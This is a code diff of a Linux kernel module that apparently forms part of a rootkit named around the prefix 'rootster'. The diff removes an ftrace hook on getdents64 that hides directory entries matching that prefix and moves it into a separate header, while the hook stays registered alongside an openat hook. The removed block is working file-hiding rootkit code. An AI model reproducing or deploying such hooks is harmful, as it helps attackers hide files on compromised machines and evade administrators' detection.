@@ -1,6 +1,5 @@
 #include "linux/kern_levels.h"
-#include "linux/slab.h"
-#include "linux/uaccess.h"
+#include "syscalls/getdents64.h"
 #include "syscalls/openat.h"
 #include <linux/dirent.h>
 #include <linux/fs.h>
@@ -117,80 +116,11 @@ void fh_remove_hook(struct ftrace_hook *hook) {
   }
 }
 
-#define PREFIX "rootster"
-
-asmlinkage long (*real_sys_getdents)(struct pt_regs *regs);
-static asmlinkage long getdents_hook(struct pt_regs *regs) {
-  int ret = real_sys_getdents(regs);
-
-  unsigned long offset = 0;
-
-  struct linux_dirent64 __user *uspace_dirent = (void __user *)regs->si;
-  struct linux_dirent64 *kspace_dirent, *current_dirent, *previous_dir = NULL;
-
-  kspace_dirent = kzalloc(ret, GFP_KERNEL);
-
-  if (copy_from_user(kspace_dirent, uspace_dirent, ret)) {
-    printk(KERN_ERR
-           "hooked_getdents64: failed to copy dirent from user space\n");
-    return ret;
-  }
-
-  while (offset < ret) {
-
-    current_dirent = (void *)kspace_dirent + offset;
-
-    unsigned long prefix_len = strlen(PREFIX);
-    unsigned long name_len = strlen(current_dirent->d_name);
-
-    if (name_len < prefix_len) {
-      previous_dir = current_dirent;
-      offset += current_dirent->d_reclen;
-      continue;
-    }
-    if (memcmp(PREFIX, current_dirent->d_name, strlen(PREFIX)) == 0 ||
-        (strstr(kspace_dirent->d_name, PREFIX) != NULL)) {
-
-      ret -= (unsigned long)current_dirent->d_reclen;
-
-      if (current_dirent == kspace_dirent) {
-        printk(KERN_INFO
-               "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
-               &current_dirent, current_dirent->d_name, current_dirent->d_type);
-        memmove(current_dirent,
-                (void *)current_dirent + current_dirent->d_reclen,
-                ret + offset);
-        continue;
-      }
-
-      previous_dir->d_reclen += current_dirent->d_reclen;
-      printk(KERN_INFO
-             "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
-             &current_dirent, current_dirent->d_name, current_dirent->d_type);
-    } else {
-
-      previous_dir = current_dirent;
-    }
-
-    offset += current_dirent->d_reclen;
-  }
-
-  if (copy_to_user(uspace_dirent, kspace_dirent, ret)) {
-    printk(
-        KERN_ERR
-        "hooked_getdents64: failed to copy dirent from kernel to user space\n");
-    return ret;
-  };
-
-  kfree(kspace_dirent);
-  return ret;
-}
-
 struct ftrace_hook demo_openat_hook =
     HOOK("__x64_sys_openat", openat_hook, &real_sys_openat);
 
 struct ftrace_hook demo_getdents_hook =
-    HOOK("__x64_sys_getdents64", getdents_hook, &real_sys_getdents);
+    HOOK("__x64_sys_getdents64", getdents64_hook, &real_sys_getdents64);
 
 static int fh_init(void) {
   int err;
